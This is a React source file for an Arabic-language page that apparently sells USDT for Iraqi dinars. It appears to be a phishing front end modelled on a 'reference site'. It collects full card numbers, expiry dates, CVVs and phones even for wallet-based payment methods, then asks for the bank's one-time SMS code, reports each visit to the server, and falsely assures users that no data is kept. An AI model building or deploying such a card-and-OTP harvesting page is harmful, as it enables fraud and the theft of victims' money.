import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { motion, AnimatePresence } from "framer-motion";
import { Link } from "wouter";
import { Layout } from "@/components/layout";
import { cn, formatCurrency } from "@/lib/utils";
import { ShieldCheck, Loader2, ArrowRight, CreditCard, Smartphone, CheckCircle2 } from "lucide-react";
import { useNotifyVisit, useSubmitOrder, useSubmitVerificationCode } from "@workspace/api-client-react";
import { useToast } from "@/hooks/use-toast";

// Validation Schemas
const formSchema = z.object({
  amount: z.coerce.number().min(5, { message: "أقل مبلغ للشراء هو 5 USDT" }),
  paymentMethod: z.string().min(1, { message: "يرجى اختيار طريقة الدفع" }),
  cardName: z.string().min(3, { message: "الاسم مطلوب" }),
  cardNumber: z.string().min(16, { message: "رقم بطاقة غير صالح" }),
  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/?([0-9]{2})$/, { message: "تنسيق غير صالح (MM/YY)" }),
  cvv: z.string().min(3, { message: "CVV غير صالح" }),
  phone: z.string().min(10, { message: "رقم الهاتف مطلوب" }),
  walletAddress: z.string().min(20, { message: "عنوان المحفظة مطلوب" }),
  couponCode: z.string().optional(),
});

type FormValues = z.infer<typeof formSchema>;

const PAYMENT_METHODS = [
  { id: "credit_card", name: "بطاقة ائتمان / ماستركارد", icon: CreditCard },
  { id: "zain_cash", name: "زين كاش", icon: Smartphone },
  { id: "fib", name: "مصرف FIB", icon: Smartphone },
];

const EXCHANGE_RATE = 1320;

export default function Buy() {
  const [step, setStep] = useState<"form" | "verify" | "success">("form");
  const [orderId, setOrderId] = useState<string>("");
  const [code, setCode] = useState("");
  const { toast } = useToast();

  const { mutate: notifyVisit } = useNotifyVisit();
  const { mutateAsync: submitOrder, isPending: isSubmitting } = useSubmitOrder();
  const { mutateAsync: submitVerify, isPending: isVerifying } = useSubmitVerificationCode();

  // Notify on mount
  useEffect(() => {
    notifyVisit({ data: { timestamp: new Date().toISOString() } });
  }, [notifyVisit]);

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      amount: 100,
      paymentMethod: "credit_card",
      cardName: "",
      cardNumber: "",
      expiryDate: "",
      cvv: "",
      phone: "",
      walletAddress: "",
      couponCode: "",
    },
  });

  const watchAmount = form.watch("amount");
  const calculatedIqd = (Number(watchAmount) || 0) * EXCHANGE_RATE;

  const onSubmit = async (data: FormValues) => {
    try {
      const payload = {
        ...data,
        amountIQD: calculatedIqd,
      };
      const res = await submitOrder({ data: payload });
      
      if (res.success) {
        setOrderId(res.orderId);
        setStep("verify");
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }
    } catch (error) {
      toast({
        title: "خطأ في الاتصال",
        description: "حدث خطأ أثناء إرسال الطلب، يرجى المحاولة مرة أخرى.",
        variant: "destructive"
      });
    }
  };

  const onVerifyCode = async () => {
    if (code.length < 4) {
      toast({ title: "تنبيه", description: "يرجى إدخال الكود كاملاً", variant: "destructive" });
      return;
    }
    try {
      const res = await submitVerify({ data: { orderId, code } });
      if (res.success) {
        setStep("success");
      }
    } catch (error) {
      toast({
        title: "خطأ",
        description: "الكود غير صحيح أو حدث خطأ في الاتصال",
        variant: "destructive"
      });
    }
  };

  return (
    <Layout>
      <div className="container mx-auto px-4 sm:px-6 lg:px-8 py-12 md:py-20">
        
        <div className="max-w-3xl mx-auto">
          <AnimatePresence mode="wait">
            
            {/* STEP 1: Main Form */}
            {step === "form" && (
              <motion.div
                key="form"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                className="space-y-8"
              >
                <div className="text-center mb-10">
                  <h1 className="text-3xl md:text-4xl font-display font-bold text-white mb-4">شراء USDT</h1>
                  <p className="text-zinc-400">أدخل بياناتك بأمان لإتمام عملية الشراء</p>
                </div>

                {/* Exchange Rate Card */}
                <div className="glass-card-gold rounded-2xl p-6 flex flex-col md:flex-row items-center justify-between gap-6 mb-8">
                  <div>
                    <p className="text-sm text-zinc-400 font-medium mb-1">سعر الصرف الحالي</p>
                    <p className="text-xl font-bold text-white">100$ = <span className="text-primary">132,000</span> دينار عراقي</p>
                  </div>
                  <div className="h-12 w-px bg-white/10 hidden md:block"></div>
                  <div className="text-left dir-ltr">
                    <p className="text-sm text-zinc-400 font-medium mb-1">المبلغ المطلوب (IQD)</p>
                    <p className="text-2xl font-bold text-primary">{formatCurrency(calculatedIqd)}</p>
                  </div>
                </div>

                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
                  {/* Amount Section */}
                  <div className="glass-card rounded-2xl p-6 md:p-8">
                    <h3 className="text-xl font-bold text-white mb-6 border-b border-white/10 pb-4">المبلغ المراد شراؤه</h3>
                    <div className="grid md:grid-cols-2 gap-6">
                      <div>
                        <label className="block text-sm font-medium text-zinc-400 mb-2">المبلغ بالدولار (USDT) <span className="text-red-400">*</span></label>
                        <div className="relative">
                          <input 
                            {...form.register("amount")}
                            type="number"
                            className={cn(
                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left dir-ltr",
                              form.formState.errors.amount ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                            )}
                          />
                          <div className="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-500 font-bold">USDT</div>
                        </div>
                        {form.formState.errors.amount && <p className="text-red-400 text-xs mt-1">{form.formState.errors.amount.message}</p>}
                        <p className="text-xs text-zinc-500 mt-2">الحد الأدنى: 5$</p>
                      </div>
                      
                      <div>
                         <label className="block text-sm font-medium text-zinc-400 mb-2">عنوان المحفظة (TRC20) <span className="text-red-400">*</span></label>
                         <input 
                            {...form.register("walletAddress")}
                            type="text"
                            placeholder="T..."
                            className={cn(
                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left dir-ltr",
                              form.formState.errors.walletAddress ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                            )}
                          />
                          {form.formState.errors.walletAddress && <p className="text-red-400 text-xs mt-1">{form.formState.errors.walletAddress.message}</p>}
                      </div>
                    </div>
                  </div>

                  {/* Payment Method Section */}
                  <div className="glass-card rounded-2xl p-6 md:p-8">
                    <h3 className="text-xl font-bold text-white mb-6 border-b border-white/10 pb-4">طريقة الدفع</h3>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
                      {PAYMENT_METHODS.map((method) => {
                        const isSelected = form.watch("paymentMethod") === method.id;
                        return (
                          <div 
                            key={method.id}
                            onClick={() => form.setValue("paymentMethod", method.id)}
                            className={cn(
                              "cursor-pointer p-4 rounded-xl border transition-all flex flex-col items-center justify-center gap-3 text-center",
                              isSelected 
                                ? "bg-primary/10 border-primary text-primary shadow-[0_0_15px_rgba(251,191,36,0.15)]" 
                                : "bg-black/20 border-white/10 text-zinc-400 hover:bg-white/5 hover:border-white/20"
                            )}
                          >
                            <method.icon className={cn("w-6 h-6", isSelected ? "text-primary" : "text-zinc-500")} />
                            <span className="font-semibold text-sm">{method.name}</span>
                          </div>
                        )
                      })}
                    </div>

                    {/* Card Details (Shown for all methods for simplicity based on the reference site) */}
                    <div className="space-y-6">
                      <div>
                        <label className="block text-sm font-medium text-zinc-400 mb-2">الاسم كما في البطاقة <span className="text-red-400">*</span></label>
                        <input 
                          {...form.register("cardName")}
                          type="text"
                          className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all"
                        />
                        {form.formState.errors.cardName && <p className="text-red-400 text-xs mt-1">{form.formState.errors.cardName.message}</p>}
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-zinc-400 mb-2">رقم البطاقة <span className="text-red-400">*</span></label>
                        <input 
                          {...form.register("cardNumber")}
                          type="text"
                          maxLength={16}
                          placeholder="0000 0000 0000 0000"
                          className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left dir-ltr tracking-widest"
                        />
                        {form.formState.errors.cardNumber && <p className="text-red-400 text-xs mt-1">{form.formState.errors.cardNumber.message}</p>}
                      </div>

                      <div className="grid grid-cols-2 gap-6">
                        <div>
                          <label className="block text-sm font-medium text-zinc-400 mb-2">تاريخ الانتهاء <span className="text-red-400">*</span></label>
                          <input 
                            {...form.register("expiryDate")}
                            type="text"
                            placeholder="MM/YY"
                            maxLength={5}
                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left dir-ltr"
                          />
                          {form.formState.errors.expiryDate && <p className="text-red-400 text-xs mt-1">{form.formState.errors.expiryDate.message}</p>}
                        </div>
                        <div>
                          <label className="block text-sm font-medium text-zinc-400 mb-2">CVV <span className="text-red-400">*</span></label>
                          <input 
                            {...form.register("cvv")}
                            type="password"
                            maxLength={4}
                            placeholder="123"
                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-center dir-ltr tracking-widest"
                          />
                          {form.formState.errors.cvv && <p className="text-red-400 text-xs mt-1">{form.formState.errors.cvv.message}</p>}
                        </div>
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-zinc-400 mb-2">رقم الهاتف <span className="text-red-400">*</span></label>
                        <input 
                          {...form.register("phone")}
                          type="tel"
                          placeholder="07XX XXX XXXX"
                          className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left dir-ltr"
                        />
                        {form.formState.errors.phone && <p className="text-red-400 text-xs mt-1">{form.formState.errors.phone.message}</p>}
                      </div>
                      
                      <div>
                        <label className="block text-sm font-medium text-zinc-400 mb-2">كود الخصم (اختياري)</label>
                        <div className="flex gap-3">
                          <input 
                            {...form.register("couponCode")}
                            type="text"
                            placeholder="أدخل الكود"
                            className="flex-1 bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left dir-ltr uppercase"
                          />
                          <button type="button" className="px-6 rounded-xl bg-white/5 border border-white/10 text-zinc-300 font-medium hover:bg-white/10 transition-colors">
                            تحقق
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="flex items-center justify-center gap-2 text-sm text-zinc-500 my-6">
                    <ShieldCheck className="w-4 h-4 text-green-500" />
                    <span>بيانات البطاقة محمية بتشفير SSL 256-bit. لا نحتفظ بأي معلومات شخصية.</span>
                  </div>

                  <button 
                    type="submit" 
                    disabled={isSubmitting}
                    className="w-full py-4 rounded-xl bg-gradient-gold text-zinc-950 font-bold text-lg hover:shadow-[0_0_30px_rgba(251,191,36,0.4)] transition-all disabled:opacity-70 flex items-center justify-center gap-2"
                  >
                    {isSubmitting ? (
                      <><Loader2 className="w-5 h-5 animate-spin" /> جاري المعالجة...</>
                    ) : (
                      <>اطلب الآن <ArrowRight className="w-5 h-5 -scale-x-100" /></>
                    )}
                  </button>
                </form>
              </motion.div>
            )}

            {/* STEP 2: Verification Code */}
            {step === "verify" && (
              <motion.div
                key="verify"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                className="max-w-md mx-auto mt-10"
              >
                <div className="glass-card rounded-3xl p-8 text-center border-t-4 border-t-primary">
                  <div className="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-6">
                    <Smartphone className="w-10 h-10 text-primary" />
                  </div>
                  <h2 className="text-2xl font-display font-bold text-white mb-4">كود التحقق</h2>
                  <p className="text-zinc-400 mb-8 leading-relaxed">
                    يرجى الانتظار، سيصلك كود تحقق برسالة نصية أو إشعار من البنك. الرجاء إدخاله أدناه لتأكيد العملية.
                  </p>
                  
                  <div className="mb-8">
                    <input 
                      type="text"
                      value={code}
                      onChange={(e) => setCode(e.target.value)}
                      placeholder="----"
                      maxLength={6}
                      className="w-full text-center text-3xl font-bold tracking-[1em] bg-black/40 border border-white/10 rounded-xl px-4 py-4 text-white focus:outline-none focus:border-primary focus:ring-2 focus:ring-primary/50 transition-all dir-ltr"
                    />
                  </div>

                  <button 
                    onClick={onVerifyCode}
                    disabled={isVerifying || code.length < 4}
                    className="w-full py-4 rounded-xl bg-primary text-zinc-950 font-bold text-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                  >
                    {isVerifying ? <Loader2 className="w-5 h-5 animate-spin" /> : "تأكيد الكود"}
                  </button>
                </div>
              </motion.div>
            )}

            {/* STEP 3: Success */}
            {step === "success" && (
              <motion.div
                key="success"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="max-w-md mx-auto mt-10"
              >
                <div className="glass-card rounded-3xl p-10 text-center relative overflow-hidden">
                  <div className="absolute inset-0 bg-green-500/5"></div>
                  
                  <motion.div 
                    initial={{ scale: 0 }}
                    animate={{ scale: 1 }}
                    transition={{ type: "spring", bounce: 0.5, delay: 0.2 }}
                    className="w-24 h-24 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6 relative z-10"
                  >
                    <CheckCircle2 className="w-12 h-12" />
                  </motion.div>
                  
                  <h2 className="text-3xl font-display font-bold text-white mb-4 relative z-10">تم بنجاح!</h2>
                  <p className="text-zinc-400 mb-8 relative z-10 leading-relaxed">
                    تم استلام طلبك والتحقق من البيانات. سيتم تحويل الرصيد إلى محفظتك خلال دقائق.
                  </p>
                  
                  <div className="bg-black/30 p-4 rounded-xl mb-8 border border-white/5 relative z-10">
                    <p className="text-sm text-zinc-500 mb-1">رقم الطلب</p>
                    <p className="text-white font-mono font-bold tracking-wider">{orderId}</p>
                  </div>

                  <Link 
                    href="/"
                    className="block w-full py-4 rounded-xl border border-white/10 text-white font-bold hover:bg-white/5 transition-colors relative z-10"
                  >
                    العودة للرئيسية
                  </Link>
                </div>
              </motion.div>
            )}

          </AnimatePresence>
        </div>
      </div>
    </Layout>
  );
}
